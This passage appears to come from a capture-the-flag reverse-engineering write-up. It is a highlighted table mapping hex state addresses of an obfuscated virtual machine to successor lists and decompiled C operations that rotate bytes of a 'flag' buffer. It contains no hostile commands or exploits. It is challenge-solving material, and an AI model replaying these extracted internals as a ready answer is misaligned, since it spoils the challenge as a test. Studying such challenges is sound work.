syscall((char)array[r0], (unsigned int)(char)array[r0 + 1], &amp;array[r0 + 2], (unsigned int)(char)array[r0 + 3]);"</span>),<br /><span style="color: rgb(255, 115, 253);">0x25b1</span>: ([<span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x24db</span>: ([<span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5754</span>: ([<span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>], <span style="color: rgb(168, 255, 96);">"  --array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3876</span>: ([<span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2cd4</span>: ([<span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x63d2</span>: ([<span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x472e</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1b12</span>: ([<span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x2e92</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6154</span>: ([<span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6ed7</span>: ([<span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x3fd4</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x68a6</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x209a</span>: ([<span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x3216</span>, <span style="color: rgb(255, 115, 253);">0x5103</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5002</span>: ([<span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5f5c</span>: ([<span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x7541</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7462</span>: ([<span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4570</span>: ([<span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x65c5</span>: ([<span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2337</span>: ([<span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4f23</span>: ([<span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x16f8</span>: ([<span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6fb6</span>: ([<span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x40cb</span>: ([<span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3725</span>: ([<span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x2b07</span>, <span style="color: rgb(255, 115, 253);">0x136e</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5e5b</span>: ([<span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x196d</span>: ([<span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x604e</span>: ([<span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2182</span>: ([<span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x5927</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x52ed</span>: ([<span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3b11</span>: ([<span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6d19</span>: ([<span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6df8</span>: ([<span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x464f</span>: ([<span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x5927</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5927</span>: ([<span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x2b07</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2b07</span>: ([<span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3d82</span>: ([<span style="color: rgb(255, 115, 253);">0x2b07</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3959</span>: ([<span style="color: rgb(255, 115, 253);">0x53cc</span>, <span style="color: rgb(255, 115, 253);">0x153a</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x136e</span>, <span style="color: rgb(255, 115, 253);">0x2b07</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x53cc</span>: ([<span style="color: rgb(255, 115, 253);">0x472e</span>, <span style="color: rgb(255, 115, 253);">0x2bdd</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x4e18</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x472e</span>: ([<span style="color: rgb(255, 115, 253);">0x4e18</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x7541</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x4e18</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4e18</span>: ([<span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x472e</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x153a</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x679b</span>: ([<span style="color: rgb(255, 115, 253);">0x4e18</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x3cbc</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1bf1</span>: ([<span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x4e18</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3137</span>: ([<span style="color: rgb(255, 115, 253);">0x1610</span>, <span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x3216</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x68a6</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1610</span>: ([<span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x2e92</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x481b</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x4d52</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2e92</span>: ([<span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x4b0f</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x188f</span>: ([<span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: 